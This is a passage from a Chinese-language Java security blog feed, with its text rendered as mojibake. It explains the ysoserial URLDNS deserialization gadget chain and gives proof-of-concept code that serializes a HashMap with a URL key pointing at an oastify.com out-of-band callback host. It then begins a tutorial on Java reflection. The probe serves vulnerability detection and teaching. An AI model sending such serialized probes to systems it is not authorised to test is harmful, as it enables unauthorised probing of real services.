å›æ˜¾ï¼Œå¯ä»¥é€šè¿‡DNSè¯·æ±‚æ¥éªŒè¯æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´</li><li>URLDNSåˆ©ç”¨é“¾ï¼Œåªèƒ½å‘èµ·DNSè¯·æ±‚ï¼Œå¹¶ä¸èƒ½è¿›è¡Œå…¶ä»–åˆ©ç”¨</li></ul><p>ysoserialä¸­åˆ—å‡ºçš„Gadget:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Gadget Chain:<br>HashMap.readObject()<br>HashMap.putVal()<br>HashMap.hash()<br>URL.hashCode()<br></code></pre></td></tr></table></figure><h3 id="åˆæ­¥å¤ç°"><a href="#åˆæ­¥å¤ç°" class="headerlink" title="åˆæ­¥å¤ç°"></a>åˆæ­¥å¤ç°</h3><p>URL æ˜¯ç”± HashMap çš„ <code>put</code> æ–¹æ³•äº§ç”Ÿçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆè·Ÿè¿› <code>put</code> æ–¹æ³•å½“ä¸­ã€‚<code>put</code> æ–¹æ³•ä¹‹ååˆæ˜¯è°ƒç”¨äº† <code>hash</code> æ–¹æ³•ï¼›<code>hash</code> æ–¹æ³•åˆ™æ˜¯è°ƒç”¨äº† <code>hashcode</code> è¿™ä¸€å‡½æ•°ã€‚</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a16.png"></p><p>å¯ä»¥çœ‹åˆ°key.hashCodeï¼Œkeyæ˜¯hashæ–¹æ³•ä¼ å…¥çš„å‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶keyçš„å€¼</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a14.png"></p><p>æ­¤æ—¶è°ƒç”¨çš„hashCodeæ–¹æ³•æ˜¯Objectç±»ä¸­çš„æ–¹æ³•</p><p>æ”»å‡»è·¯çº¿ä¸­ æ‰¾åˆ°å…¥å£ç±»ä¹‹åè¦æ‰¾è°ƒç”¨é“¾ gadget chain ç›¸åŒåç§°ã€ç›¸åŒç±»å‹</p><p>åˆ©ç”¨URLç±»ä¸­ç›¸åŒçš„æ–¹æ³•åï¼Œä½¿å…¶è°ƒç”¨åˆ°URLç±»ä¸­çš„hashCodeæ–¹æ³•</p><p>æ¥åˆ°URLç±»ä¸­çš„hashCodeæ–¹æ³•</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a17.png"></p><p>L ä¸­çš„ <code>hashCode</code> è¢« <code>handler</code> è¿™ä¸€å¯¹è±¡æ‰€è°ƒç”¨ï¼Œ<code>handler</code> åˆæ˜¯ <code>URLStreamHandler</code> çš„æŠ½è±¡ç±»ã€‚æˆ‘ä»¬å†å»æ‰¾ <code>URLStreamHandler</code> çš„ <code>hashCode</code> æ–¹æ³•ã€‚</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a18.png"></p><p>æ­¤æ–¹æ³•ä¸­åˆè°ƒç”¨äº†<code>getByName(host)</code>æ–¹æ³•ï¼Œå®ƒçš„ä½œâ½¤æ˜¯æ ¹æ®ä¸»æœºåï¼Œè·å–å…¶ IP åœ°å€ï¼Œåœ¨â½¹ç»œä¸Šå…¶å®å°±æ˜¯â¼€æ¬¡ DNS æŸ¥è¯¢ã€‚åˆ°è¿™â¾¥å°±ä¸å¿…è¦å†è·Ÿäº†ã€‚</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a19.png"></p><p>uå°±æ˜¯åˆšå¼€å§‹ä¼ å…¥çš„å‚æ•°keyï¼Œæ‰€ä»¥ä¼ é€’å‚æ•°ä¸º</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">hashmap.put(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;DNSç”Ÿæˆçš„ URLï¼Œç”¨dnslogå°±å¯ä»¥&quot;</span>),<span class="hljs-number">1</span>);<br><br><span class="hljs-comment">// ä¼ è¿›å»ä¸¤ä¸ªå‚æ•°ï¼Œkey = å‰é¢é‚£ä¸²ç½‘å€ï¼Œvalue = 1</span><br></code></pre></td></tr></table></figure><p>URLDNS çš„Gadget</p><ol><li>HashMap-&gt;readObject()</li><li>HashMap-&gt;hash()</li><li>URL-&gt;hashCode()</li><li>URLStreamHandler-&gt;hashCode()</li><li>URLStreamHandler-&gt;getHostAddress()</li><li>InetAddress-&gt;getByName()</li></ol><h3 id="é—®é¢˜è§£å†³"><a href="#é—®é¢˜è§£å†³" class="headerlink" title="é—®é¢˜è§£å†³"></a>é—®é¢˜è§£å†³</h3><h4 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h4><p>åœ¨è¿™é‡Œæœ‰ä¸€ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹</p><ul><li>æˆ‘ä»¬çš„å¤ç°æ­¥éª¤ï¼š</li></ul><p><strong>SerializationTest.java</strong> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src;<br><br><span class="hljs-keyword">import</span> src.Person;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutput;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializationTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>, <span class="hljs-number">22</span>);<br>        HashMap&lt;URL,Integer&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL,Integer&gt;();<br>        hashmap.put(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://p1rqenbukfug86be3r4n202x9off36rv.oastify.com&quot;</span>), <span class="hljs-number">1</span>);<br>        serialize(hashmap);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨è¿è¡Œåºåˆ—åŒ–æ–‡ä»¶æ—¶å°±ä¼šæ”¶åˆ°DNSè¯·æ±‚</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a21.png"></p><p>åŸå› æ˜¯åœ¨è¿è¡ŒSerializationTestä»£ç æ—¶URLDNSé“¾å­é™¤äº†å¼€å§‹æ—¶çš„readObjectï¼Œå…¶ä½™ä¼šæ­£å¸¸æ‰§è¡Œ</p><p>è¿™é‡Œè¦çœ‹åˆ°URLç±»ä¸­çš„hashCodeæ–¹æ³•ï¼Œå½“ <code>hashCode</code> çš„å€¼ä¸ç­‰äº -1 çš„æ—¶å€™ï¼Œå‡½æ•°å°±ä¼šç›´æ¥ <code>return hashCode</code> è€Œä¸æ‰§è¡Œ <code>hashCode = handler.hashCode(this);</code>ã€‚</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a17.png"></p><p>è€Œåœ¨URLç±»ä¸­hashCodeè®¾ç½®çš„å€¼å°±æ˜¯-1</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a20.png"></p><p>æ‰€ä»¥åºåˆ—åŒ–æ—¶ä¹Ÿä¼šæ”¶åˆ°DNSè¯·æ±‚</p><h4 id="è§£å†³"><a href="#è§£å†³" class="headerlink" title="è§£å†³"></a>è§£å†³</h4><p>ä¸ºäº†æµ‹è¯•æ˜¯å¦æœ‰ååºåˆ—åŒ–æ¼æ´ï¼Œè®©æˆ‘ä»¬çš„è§†è§’ä¸å—å¹²æ‰°</p><p>å¯ä»¥åˆ©ç”¨åå°„ä¿®æ”¹hashCodeçš„åˆå§‹å€¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 1. åˆ›å»ºURLå¯¹è±¡ï¼ˆä½†ä¸å‘èµ·å®é™…ç½‘ç»œè¯·æ±‚ï¼‰</span><br><span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://bl00nzimnnujskz418kboqxt9kfb30.oastify.com&quot;</span>);<br><span class="hljs-comment">// 2. è·å–URLå¯¹è±¡çš„Classå¯¹è±¡</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();<br><span class="hljs-comment">// 3. è·å–URLç±»ä¸­çš„ç§æœ‰å­—æ®µhashCode</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">hashcodefile</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br><span class="hljs-comment">// 4. è§£é™¤ç§æœ‰å­—æ®µçš„è®¿é—®é™åˆ¶</span><br>hashcodefile.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">// 5. å¼ºè¡Œè®¾ç½®è¯¥URLå¯¹è±¡çš„hashCodeå€¼ä¸º1234</span><br>hashcodefile.set(url, <span class="hljs-number">1234</span>);<br><span class="hljs-comment">// 6. å°†URLå¯¹è±¡ä½œä¸ºKeyæ”¾å…¥HashMap</span><br>hashmap.put(url, <span class="hljs-number">1</span>);<br><span class="hljs-comment">// 7. å†æ¬¡é€šè¿‡åå°„å°†hashCodeæ”¹å›-1ï¼ˆè§¦å‘é‡æ–°è®¡ç®—çš„çŠ¶æ€ï¼‰</span><br>hashcodefile.set(url, -<span class="hljs-number">1</span>);<br><span class="hljs-comment">// 8. åºåˆ—åŒ–è¿™ä¸ªHashMap</span><br>serialize(hashmap);<br></code></pre></td></tr></table></figure><p>URLDNS ååºåˆ—åŒ–åˆ©ç”¨é“¾çš„ POC</p><p>æ ¹æ®æˆ‘ä»¬çš„æ€è·¯ï¼Œå°† Main å‡½æ•°è¿›è¡Œä¿®æ”¹</p><p><strong>SerializationTest.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br> <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-number">22</span>);  <br> HashMap&lt;URL,Integer&gt; hashmap= <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL,Integer&gt;();  <br> <span class="hljs-comment">// è¿™é‡Œä¸è¦å‘èµ·è¯·æ±‚  </span><br> <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://bl00nzimnnujskz418kboqxt9kfb30.oastify.com&quot;</span>); <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">hashcodefile</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);  <br> hashcodefile.setAccessible(<span class="hljs-literal">true</span>);  <br> hashcodefile.set(url,<span class="hljs-number">1234</span>);  <br> hashmap.put(url,<span class="hljs-number">1</span>);  <br> <span class="hljs-comment">// è¿™é‡ŒæŠŠ hashCode æ”¹ä¸º -1ï¼› é€šè¿‡åå°„çš„æŠ€æœ¯æ”¹å˜å·²æœ‰å¯¹è±¡çš„å±æ€§  </span><br> hashcodefile.set(url,-<span class="hljs-number">1</span>);  <br> serialize(hashmap);  <br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ ·è¿è¡Œååºåˆ—åŒ–åå°±åªèƒ½æ”¶åˆ°ååºåˆ—åŒ–æ—¶å‘å‡ºçš„è¯·æ±‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://drun1baby.top/2022/05/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-01-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A6%82%E5%BF%B5%E4%B8%8E%E5%88%A9%E7%94%A8/#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87">Javaååºåˆ—åŒ–åŸºç¡€ç¯‡-01-ååºåˆ—åŒ–æ¦‚å¿µä¸åˆ©ç”¨ | Drunkbabyâ€™s Blog</a></p><p><a href="https://blog.csdn.net/mocas_wang/article/details/107621010">javaåºåˆ—åŒ–ä¸ååºåˆ—åŒ–å…¨è®²è§£_åºåˆ—åŒ–å’Œååºåˆ—å·éœ€è¦æ„é€ æ— å‚å‡½æ•°çš„æ„ä¹‰-CSDNåšå®¢</a></p>]]></content>
    
    
    <categories>
      
      <category>Javaå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Javaå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaå®‰å…¨-åå°„</title>
    <link href="/2025/08/14/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%B0%84/"/>
    <url>/2025/08/14/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%B0%84/</url>
    
    <content type="html"><![CDATA[<h1 id="Javaå®‰å…¨-åå°„"><a href="#Javaå®‰å…¨-åå°„" class="headerlink" title="Javaå®‰å…¨-åå°„"></a>Javaå®‰å…¨-åå°„</h1><h2 id="åˆæ­¥è®¤è¯†"><a href="#åˆæ­¥è®¤è¯†" class="headerlink" title="åˆæ­¥è®¤è¯†"></a>åˆæ­¥è®¤è¯†</h2><p>åå°„æ˜¯å¤§å¤šæ•°è¯­è¨€é‡Œéƒ½å¿…ï¥§å¯å°‘çš„ç»„æˆéƒ¨åˆ†ï¼Œå¯¹è±¡å¯ä»¥é€šè¿‡åå°„è·å–ä»–çš„ç±»ï¼Œç±»å¯ä»¥é€šè¿‡åå°„æ‹¿åˆ°æ‰€æœ‰æ–¹æ³•ï¼ˆåŒ…æ‹¬ç§æœ‰ï¼‰ï¼Œæ‹¿åˆ°çš„æ–¹æ³•å¯ä»¥è°ƒç”¨ï¼Œæ€»ä¹‹é€šè¿‡â€œåå°„â€ï¼Œæˆ‘ä»¬å¯ä»¥å°†Javaè¿™ç§é™æ€è¯­è¨€é™„åŠ ä¸ŠåŠ¨æ€ç‰¹æ€§</p><p>ä¸€æ®µä»£ç ï¼Œæ”¹å˜å…¶ä¸­çš„å˜ï¥¾ï¼Œå°†ä¼šå¯¼è‡´è¿™æ®µä»£ç äº§ç”ŸåŠŸèƒ½æ€§çš„å˜åŒ–ï¼Œå¯ä»¥ç§°ä¹‹ä¸ºåŠ¨æ€ç‰¹æ€§</p><p>PHPæœ¬èº«æ‹¥æœ‰å¾ˆå¤šåŠ¨æ€ç‰¹æ€§ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡â€œä¸€ï¤†è¯æœ¨é©¬â€æ¥æ‰§ï¨ˆå„ç§åŠŸèƒ½ï¼›Javaè™½ï¥§åƒPHPé‚£ä¹ˆçµæ´»ï¼Œ ä½†å…¶æä¾›çš„â€œåå°„â€åŠŸèƒ½ï¼Œä¹Ÿæ˜¯å¯ä»¥æä¾›ä¸€äº›åŠ¨æ€ç‰¹æ€§ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">(String className, String methodName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br> <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(className);<br> clazz.getMethod(methodName).invoke(clazz.newInstance());<br> &#125;<br></code></pre></td></tr></table></figure><ul><li>è·å–ç±»çš„æ–¹æ³•ï¼š forName </li><li>å®ä¾‹åŒ–ç±»å¯¹è±¡çš„æ–¹æ³•ï¼š newInstance </li><li>è·å–å‡½æ•°çš„æ–¹æ³•ï¼š getMethod getConstructor</li><li>æ‰§ï¨ˆå‡½æ•°çš„æ–¹æ³•ï¼š invoke</li></ul><h2 id="å¯¹åå°„çš„ç†è§£"><a href="#å¯¹åå°„çš„ç†è§£" class="headerlink" title="å¯¹åå°„çš„ç†è§£"></a>å¯¹åå°„çš„ç†è§£</h2><h3 id="æ­£å°„ä¸åå°„"><a href="#æ­£å°„ä¸åå°„" class="headerlink" title="æ­£å°„ä¸åå°„"></a>æ­£å°„ä¸åå°„</h3><p>æ­£å°„</p><p>æˆ‘ä»¬åœ¨ç¼–å†™ä»£ç æ—¶ï¼Œå½“éœ€è¦ä½¿ç”¨åˆ°æŸä¸€ä¸ªç±»çš„æ—¶å€™ï¼Œéƒ½ä¼šå…ˆäº†è§£è¿™ä¸ªç±»æ˜¯åšä»€ä¹ˆçš„ã€‚ç„¶åå®ä¾‹åŒ–è¿™ä¸ªç±»ï¼Œæ¥ç€ç”¨å®ä¾‹åŒ–å¥½çš„å¯¹è±¡è¿›è¡Œæ“ä½œï¼Œè¿™å°±æ˜¯æ­£å°„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>student.doHomework(<span class="hljs-string">&quot;æ•°å­¦&quot;</span>);<br></code></pre></td></tr></table></figure><p>åå°„</p><p>åå°„å°±æ˜¯ï¼Œä¸€å¼€å§‹å¹¶ä¸çŸ¥é“æˆ‘ä»¬è¦åˆå§‹åŒ–çš„ç±»å¯¹è±¡æ˜¯ä»€ä¹ˆï¼Œè‡ªç„¶ä¹Ÿæ— æ³•ä½¿ç”¨ new å…³é”®å­—æ¥åˆ›å»ºå¯¹è±¡äº†ã€‚æˆ‘ä»¬ä»¥è¿™ä¸€æ®µç»å…¸çš„åå°„ä»£ç ä¸ºä¾‹è¯´æ˜ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>    <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> person.getClass();<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>æˆ‘ä»¬æ³¨æ„åˆ°åœ¨ä»£ç å—ä¸­å‡ºç°äº†å¤§å†™ C å¼€å¤´çš„ Classï¼›</p></blockquote><p><strong>ç†è§£åå°„çš„ç¬¬ä¸€æ­¥å°±å¿…é¡»å…ˆææ¸…æ¥š <code>Class</code> æ˜¯ä»€ä¹ˆã€‚</strong></p><h3 id="Java-Class-å¯¹è±¡ç†è§£"><a href="#Java-Class-å¯¹è±¡ç†è§£" class="headerlink" title="Java Class å¯¹è±¡ç†è§£"></a>Java Class å¯¹è±¡ç†è§£</h3><p>æˆ‘ä»¬ç¨‹åºåœ¨è¿è¡Œçš„æ—¶å€™ä¼šç¼–è¯‘ç”Ÿæˆä¸€ä¸ª <code>.class</code> æ–‡ä»¶ï¼Œè€Œè¿™ä¸ª <code>.class</code> æ–‡ä»¶ä¸­çš„å†…å®¹å°±æ˜¯ç›¸å¯¹åº”çš„ç±»çš„æ‰€æœ‰ä¿¡æ¯ï¼Œæ¯”å¦‚è¿™æ®µç¨‹åºå½“ä¸­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>    <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> person.getClass();<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶å® <code>person.class</code> å°±æ˜¯ <code>Class</code>ï¼ŒClass ä¹Ÿå°±æ˜¯æè¿°ç±»çš„ç±»ã€‚</p><p><strong>Class ç±»çš„å¯¹è±¡ä½œç”¨</strong>æ˜¯è¿è¡Œæ—¶æä¾›æˆ–è·å¾—æŸä¸ªå¯¹è±¡çš„ç±»å‹ä¿¡æ¯ã€‚</p><blockquote><p>æ‰€ä»¥åå°„å…¶å®å°±æ˜¯æ“ä½œ <code>Class</code>ï¼Œçœ‹æ¸…æ¥šäº†ï¼Œæ˜¯å¤§ C</p></blockquote><h2 id="åå°„çš„ä½¿ç”¨æ–¹æ³•"><a href="#åå°„çš„ä½¿ç”¨æ–¹æ³•" class="headerlink" title="åå°„çš„ä½¿ç”¨æ–¹æ³•"></a>åå°„çš„ä½¿ç”¨æ–¹æ³•</h2><h3 id="1-å®ä¾‹åŒ–å¯¹è±¡"><a href="#1-å®ä¾‹åŒ–å¯¹è±¡" class="headerlink" title="1.å®ä¾‹åŒ–å¯¹è±¡"></a>1.å®ä¾‹åŒ–å¯¹è±¡</h3><p>å®ä¾‹åŒ–å¯¹è±¡çš„æ ¸å¿ƒåŸå› æ˜¯ï¼š<strong>è¦åœ¨å†…å­˜é‡Œäº§ç”Ÿä¸€ä¸ªå…·ä½“çš„å®ä½“ï¼Œæ‰èƒ½å­˜å‚¨å’Œæ“ä½œè¯¥ç±»çš„å±æ€§ã€è°ƒç”¨å®ƒçš„éé™æ€æ–¹æ³•</strong>ã€‚</p><p>éé™æ€æ–¹æ³•éœ€è¦å¯¹è±¡æ‰èƒ½è°ƒç”¨</p><ul><li>é™æ€æ–¹æ³•ï¼ˆ<code>static</code>ï¼‰è·Ÿç±»ç»‘å®šï¼Œä¸éœ€è¦å¯¹è±¡å°±èƒ½ç”¨ã€‚</li><li>éé™æ€æ–¹æ³•ä¾èµ–å®ä¾‹æ•°æ®ï¼Œæ‰€ä»¥å¿…é¡»å…ˆæœ‰ä¸€ä¸ªå¯¹è±¡ï¼ˆå®ä¾‹ï¼‰æ‰èƒ½æ‰§è¡Œ</li></ul><p>å¯¹äºæ™®é€šç”¨æˆ·æˆ‘ä»¬å¯ä»¥é‡‡ç”¨ä»¥ä¸‹æ–¹æ³•åˆ›å»ºå®ä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Person</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br></code></pre></td></tr></table></figure><p>è€Œæˆ‘ä»¬åœ¨åˆ›å»º Class ç±»çš„å®ä¾‹å¯¹è±¡å´ä¸èƒ½ä½¿ç”¨ä¸Šè¿°æ–¹æ³•ï¼Œè¿è¡Œä¼šæŠ›å‡ºé”™è¯¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>();<br></code></pre></td></tr></table></figure><p>å› ä¸º Class ç±»æ˜¯ <code>private</code> ç§æœ‰å±æ€§ï¼Œæˆ‘ä»¬ä¹Ÿæ— æ³•é€šè¿‡åˆ›å»ºå¯¹è±¡çš„æ–¹å¼æ¥è·å– class å¯¹è±¡ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ€æ ·æ‰èƒ½å¤Ÿè·å–åˆ° class å¯¹è±¡å‘¢ï¼Ÿä¸€èˆ¬æˆ‘ä»¬è·å– class å¯¹è±¡å°±æœ‰ä»¥ä¸‹ä¸‰ç§æ–¹æ³•ï¼Œæˆ‘ä»¬æ¥é€ä¸€çœ‹çœ‹ã€‚</p><h4 id="æ–¹æ³•ä¸€ã€å®ä¾‹åŒ–å¯¹è±¡çš„getClass-æ–¹æ³•"><a href="#æ–¹æ³•ä¸€ã€å®ä¾‹åŒ–å¯¹è±¡çš„getClass-æ–¹æ³•" class="headerlink" title="æ–¹æ³•ä¸€ã€å®ä¾‹åŒ–å¯¹è±¡çš„getClass()æ–¹æ³•"></a>æ–¹æ³•ä¸€ã€å®ä¾‹åŒ–å¯¹è±¡çš„getClass()æ–¹æ³•</h4><p>å¦‚æœä¸Šä¸‹â½‚ä¸­å­˜åœ¨æŸä¸ªç±»çš„å®ä¾‹ <code>obj</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>obj.getClass</code> æ¥è·å–å®ƒçš„ç±»ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TestReflection</span> <span class="hljs-variable">testReflection</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestReflection</span>();<br><span class="hljs-type">Class</span> <span class="hljs-variable">class3</span> <span class="hljs-operator">=</span> testReflection.getClass();<br></code></pre></td></tr></table></figure><h4 id="æ–¹æ³•äºŒã€-ä½¿ç”¨ç±»çš„-class-æ–¹æ³•"><a href="#æ–¹æ³•äºŒã€-ä½¿ç”¨ç±»çš„-class-æ–¹æ³•" class="headerlink" title="æ–¹æ³•äºŒã€ ä½¿ç”¨ç±»çš„ .class æ–¹æ³•"></a>æ–¹æ³•äºŒã€ ä½¿ç”¨ç±»çš„ .class æ–¹æ³•</h4><p>å¦‚æœä½ å·²ç»åŠ è½½äº†æŸä¸ªç±»ï¼Œåªæ˜¯æƒ³è·å–åˆ°å®ƒçš„ <code>java.lang.Class</code> å¯¹è±¡ï¼Œé‚£ä¹ˆå°±ç›´æ¥æ‹¿å®ƒçš„ <code>class</code> å±æ€§å³å¯ã€‚è¿™ä¸ªâ½…æ³•å…¶å®ä¸å±äºåå°„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">class2</span> <span class="hljs-operator">=</span> TestReflection.class;<br></code></pre></td></tr></table></figure><h4 